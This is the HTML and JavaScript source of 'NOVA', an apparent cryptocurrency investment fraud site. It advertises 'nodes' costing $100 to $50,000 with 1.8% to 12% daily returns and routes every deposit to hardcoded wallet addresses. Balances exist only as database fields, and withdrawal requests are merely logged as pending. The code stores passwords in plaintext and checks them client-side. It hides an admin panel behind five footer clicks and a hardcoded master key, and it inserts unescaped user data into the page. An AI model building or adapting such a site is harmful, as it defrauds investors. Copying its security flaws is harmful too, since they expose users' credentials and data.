<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOVA | Institutional Asset Protocol</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #050A18; --accent: #64FFDA; --card-bg: #112240; --text-main: #CCD6F6; --text-dim: #8892B0; --gold: #FFD700; --danger: #FF4D4D; }
        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--primary); color: var(--text-main); line-height: 1.6; overflow-x: hidden; }
        
        .glass { background: rgba(17, 34, 64, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(100, 255, 218, 0.1); border-radius: 16px; padding: 25px; margin-bottom: 20px; }
        .ticker { background: #020c1b; color: var(--accent); padding: 10px; font-size: 11px; text-align: center; border-bottom: 1px solid #112240; letter-spacing: 1px; }
        
        #dashboard { display: none; padding: 20px; max-width: 1200px; margin: auto; animation: fadeInUp 0.8s ease; }
        
        /* Stats Grid */
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; margin-bottom: 25px; }
        .stat-card { text-align: left; border-left: 4px solid var(--accent); }
        .stat-card h2 { margin: 5px 0; color: var(--accent); font-size: 1.6rem; font-weight: 800; }
        .stat-card span { font-size: 10px; color: var(--text-dim); text-transform: uppercase; }

        /* Nodes Grid */
        .node-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin-top: 20px; }
        .node-card { background: var(--card-bg); border-radius: 12px; overflow: hidden; transition: 0.4s; border: 1px solid #233554; position: relative; }
        .node-card:hover { transform: translateY(-10px); border-color: var(--accent); box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
        .node-img { width: 100%; height: 150px; object-fit: cover; opacity: 0.7; }
        .node-info { padding: 15px; }
        .countdown { color: var(--gold); font-family: monospace; font-size: 12px; font-weight: bold; }

        /* Tabs & Actions */
        .btn-prime { width: 100%; padding: 14px; background: var(--accent); color: var(--primary); border: none; border-radius: 8px; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: 0.3s; margin-top: 10px; }
        .btn-prime:hover { filter: brightness(1.2); box-shadow: 0 0 15px rgba(100, 255, 218, 0.4); }
        input, select { width: 100%; padding: 12px; background: #020c1b; border: 1px solid #233554; color: white; border-radius: 6px; margin: 8px 0; box-sizing: border-box; }

        #auth-page { display: flex; align-items: center; justify-content: center; min-height: 100vh; background: radial-gradient(circle, #0a192f 0%, #020c1b 100%); }
        .history-table { width: 100%; border-collapse: collapse; font-size: 11px; margin-top: 10px; }
        .history-table th { text-align: left; color: var(--accent); padding: 10px; border-bottom: 1px solid #233554; }
        .history-table td { padding: 10px; border-bottom: 1px solid #112240; }

        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div class="ticker"><marquee>NOVA PROTOCOL v4.2 | 15 ACTIVE NODES ONLINE | GLOBAL LIQUIDITY POOL: 2.4M USDT | SECURE CONNECTION ESTABLISHED</marquee></div>

    <div id="auth-page">
        <div class="glass" style="max-width: 420px; width: 90%;">
            <center>
                <h1 style="color:var(--accent); margin:0; letter-spacing:4px;">NOVA</h1>
                <p style="font-size:10px; color:var(--text-dim); margin-bottom:25px;">INSTITUTIONAL ASSET TERMINAL</p>
            </center>
            <input type="text" id="username" placeholder="User ID">
            <input type="password" id="password" placeholder="Access Key">
            <button class="btn-prime" onclick="handleAuth()" id="authBtn">Establish Connection</button>
            <p id="toggleText" style="text-align:center; font-size:11px; margin-top:15px; cursor:pointer; color:var(--accent);" onclick="toggleAuth()">New Associate? Register Node ID</p>
            <div style="font-size:11px; color:var(--text-dim); margin-top:20px; border-top:1px solid #233554; padding-top:10px; text-align:justify;">
                NOVA is a global asset protocol specializing in node validation and institutional-grade liquidity provision. High-frequency encryption active.
            </div>
        </div>
    </div>

    <div id="dashboard">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:25px;">
            <div>
                <h2 style="margin:0;">SYSTEM: <span id="userDisp" style="color:var(--accent);"></span></h2>
                <span style="font-size:10px; color:var(--text-dim);">ENCRYPTION: AES-256 | STATUS: SECURE</span>
            </div>
            <button onclick="logout()" style="background:none; border:1px solid #233554; color:gray; cursor:pointer; padding:8px 15px; border-radius:5px;">TERMINATE</button>
        </div>

        <div class="stats-grid">
            <div class="glass stat-card"><span>Global Balance</span><h2 id="bal">$0.00</h2></div>
            <div class="glass stat-card"><span>Daily ROI Yield</span><h2 id="daily">$0.00</h2></div>
            <div class="glass stat-card"><span>Total Generated</span><h2 id="totalP">$0.00</h2></div>
            <div class="glass stat-card"><span>Sync Status</span><h2 style="color:var(--accent);">100%</h2></div>
        </div>

        <h3>Infrastructure Marketplace (10 Global + 5 Core)</h3>
        <div class="node-container" id="nodeGrid"></div>

        <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap:20px; margin-top:30px;">
            <div class="glass">
                <h3 style="color:var(--accent);">DEPOSIT GATEWAY</h3>
                <div style="display:flex; gap:10px; margin-bottom:10px;">
                    <button onclick="copyWal('0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37')" style="flex:1; font-size:10px;">Trust Wallet</button>
                    <button onclick="copyWal('0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2')" style="flex:1; font-size:10px;">MetaMask</button>
                </div>
                <select id="depNet"><option>USDT (BEP20)</option><option>USDT (ERC20)</option><option>TRX (TRC20)</option></select>
                <input type="text" id="tid" placeholder="Transaction Hash (TID)">
                <input type="file" id="proof" accept="image/*">
                <button class="btn-prime" onclick="submitDep()">Initialize Activation</button>
            </div>

            <div class="glass">
                <h3 style="color:var(--danger);">WITHDRAWAL HUB</h3>
                <select id="witNet"><option>Binance Pay</option><option>Trust Wallet</option><option>MetaMask</option><option>OKX</option></select>
                <input type="number" id="witAmt" placeholder="Amount (Min $10)">
                <input type="text" id="witAddr" placeholder="Target Wallet Address">
                <button class="btn-prime" style="background:var(--danger); color:white;" onclick="submitWit()">Request Exit</button>
            </div>
        </div>

        <div class="glass">
            <h3>PROTOCOL LOGS (HISTORY)</h3>
            <table class="history-table">
                <thead><tr><th>Type</th><th>Amount</th><th>Status</th><th>Date</th></tr></thead>
                <tbody id="histBody"></tbody>
            </table>
        </div>

        <div class="glass" style="font-size:12px;">
            <details><summary><b>Company Details & Compliance</b></summary>
                <p>NOVA Protocol Singapore HQ. Registered: #SG-8821. Liquidity managed via cold storage clusters. Privacy Policy: All data encrypted.</p>
            </details>
            <details><summary><b>FAQ</b></summary>
                <p>Withdrawals take 2-24 hours. Node activation requires 3 network confirmations.</p>
            </details>
        </div>

        <center id="secret-trigger" style="padding:40px; color:gray; font-size:9px;">&copy; 2026 NOVA CAPITAL GLOBAL | ALL RIGHTS RESERVED</center>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, collection, getDocs, query, where } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let isLogin = true;
        window.toggleAuth = () => {
            isLogin = !isLogin;
            document.getElementById('authBtn').innerText = isLogin ? "Establish Connection" : "Register Node ID";
            document.getElementById('toggleText').innerText = isLogin ? "New Associate? Register Node ID" : "Already Registered? Login";
        };

        window.handleAuth = async () => {
            const u = document.getElementById('username').value.toLowerCase().trim();
            const p = document.getElementById('password').value;
            if(!u || !p) return alert("Fill all fields, sweetie.");
            const snap = await getDoc(doc(db, "users", u));
            if(isLogin) {
                if(snap.exists() && snap.data().password === p) { sessionStorage.setItem("nova_user", u); location.reload(); }
                else alert("Access Denied.");
            } else {
                await setDoc(doc(db, "users", u), { password: p, balance: 0, daily: 0, totalP: 0 });
                alert("Registered! Now Login."); toggleAuth();
            }
        };

        window.submitDep = async () => {
            const tid = document.getElementById('tid').value;
            const file = document.getElementById('proof').files[0];
            if(!tid || !file) return alert("All fields required, sweetie.");
            const reader = new FileReader();
            reader.onloadend = async () => {
                await setDoc(doc(db, "transactions", "tx_"+Date.now()), {
                    user: sessionStorage.getItem("nova_user"), type: "Deposit", status: "Pending", 
                    tid: tid, proof: reader.result, method: document.getElementById('depNet').value, date: new Date().toLocaleString()
                });
                alert("Submitted!"); location.reload();
            };
            reader.readAsDataURL(file);
        };

        window.submitWit = async () => {
            const amt = document.getElementById('witAmt').value;
            const addr = document.getElementById('witAddr').value;
            if(amt < 10) return alert("Min $10.");
            await setDoc(doc(db, "transactions", "wit_"+Date.now()), {
                user: sessionStorage.getItem("nova_user"), type: "Withdrawal", status: "Pending",
                amount: amt, address: addr, method: document.getElementById('witNet').value, date: new Date().toLocaleString()
            });
            alert("Withdrawal Requested!"); location.reload();
        };

        function renderNodes() {
            const container = document.getElementById('nodeGrid');
            const nodes = [
                {n:"London-Alpha", c:100, r:1.8, p:"https://images.unsplash.com/photo-1558494949-ef010cbdcc51?w=400"},
                {n:"Tokyo-Beta", c:200, r:2.0, p:"https://images.unsplash.com/photo-1518770660439-4636190af475?w=400"},
                {n:"NY-Gamma", c:300, r:2.2, p:"https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=400"},
                {n:"Dubai-Delta", c:500, r:2.5, p:"https://images.unsplash.com/photo-1510511459019-5dee99c43dbf?w=400"},
                {n:"SG-Epsilon", c:1000, r:2.8, p:"https://images.unsplash.com/photo-1460925895917-afdab827c52f?w=400"},
                {n:"Paris-Zeta", c:1500, r:3.0, p:"https://images.unsplash.com/photo-1563986768609-322da13575f3?w=400"},
                {n:"Sydney-Eta", c:2000, r:3.2, p:"https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=400"},
                {n:"Berlin-Theta", c:2500, r:3.5, p:"https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=400"},
                {n:"HK-Iota", c:3000, r:3.8, p:"https://images.unsplash.com/photo-1480694313141-fce5e697ee25?w=400"},
                {n:"Zurich-Kappa", c:5000, r:4.2, p:"https://images.unsplash.com/photo-1531297484001-80022131f5a1?w=400"},
                {n:"CORE-V1", c:7000, r:5.0, p:"https://images.unsplash.com/photo-1517433447747-22615461a299?w=400"},
                {n:"CORE-V2", c:10000, r:6.0, p:"https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=400"},
                {n:"CORE-V3", c:15000, r:7.5, p:"https://images.unsplash.com/photo-1525547719571-a2d4ac8945e2?w=400"},
                {n:"CORE-V4", c:25000, r:9.0, p:"https://images.unsplash.com/photo-1504384308090-c894fdcc538d?w=400"},
                {n:"CORE-MAX", c:50000, r:12.0, p:"https://images.unsplash.com/photo-1551434678-e076c223a692?w=400"}
            ];
            nodes.forEach(x => {
                container.innerHTML += `
                <div class="node-card">
                    <img src="${x.p}" class="node-img">
                    <div class="node-info">
                        <h4 style="margin:0;">${x.n}</h4>
                        <p style="font-size:11px; color:gray; margin:5px 0;">Cost: $${x.c} | ROI: ${x.r}% Daily</p>
                        <div class="countdown">SYNC: 23:59:59</div>
                        <button class="btn-prime" style="padding:8px;" onclick="copyWal('0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37')">Activate</button>
                    </div>
                </div>`;
            });
        }

        async function loadUI() {
            const user = sessionStorage.getItem("nova_user");
            document.getElementById('auth-page').style.display='none';
            document.getElementById('dashboard').style.display='block';
            document.getElementById('userDisp').innerText = user;
            renderNodes();

            const uSnap = await getDoc(doc(db,"users",user));
            if(uSnap.exists()){
                const d = uSnap.data();
                document.getElementById('bal').innerText = "$"+(d.balance||0).toFixed(2);
                document.getElementById('daily').innerText = "$"+(d.daily||0).toFixed(2);
                document.getElementById('totalP').innerText = "$"+(d.totalP||0).toFixed(2);
            }

            const qSnap = await getDocs(query(collection(db,"transactions"), where("user","==",user)));
            const body = document.getElementById('histBody');
            qSnap.forEach(t => { 
                const d = t.data();
                body.innerHTML += `<tr><td>${d.type}</td><td>${d.amount||"Pending"}</td><td>${d.status}</td><td>${d.date}</td></tr>`;
            });
        }

        let adminC = 0;
        document.getElementById('secret-trigger').onclick = async () => {
            adminC++;
            if(adminC===5){
                const p = prompt("Master Key:");
                if(p==="nova_boss_786"){
                    const snap = await getDocs(collection(db,"transactions"));
                    let h = `<div style="background:#020c1b; color:white; padding:20px; font-size:11px;"><button onclick="location.reload()">Exit</button><h2>MASTER TERMINAL</h2><table border="1" style="width:100%; border-collapse:collapse;"><tr><th>User</th><th>Type</th><th>TID/Addr</th><th>Proof</th></tr>`;
                    snap.forEach(d => {
                        const data = d.data();
                        const proof = data.proof ? `<img src="${data.proof}" width="80" onclick="window.open(this.src)">` : "N/A";
                        h += `<tr><td>${data.user}</td><td>${data.type}</td><td>${data.tid||data.address}</td><td>${proof}</td></tr>`;
                    });
                    document.body.innerHTML = h + `</table></div>`;
                }
                adminC=0;
            }
        };

        window.copyWal = (a) => { navigator.clipboard.writeText(a); alert("Copied, sweetie!"); };
        window.logout = () => { sessionStorage.clear(); location.reload(); };

        if(sessionStorage.getItem("nova_user")) loadUI();
    </script>
</body>
</html>
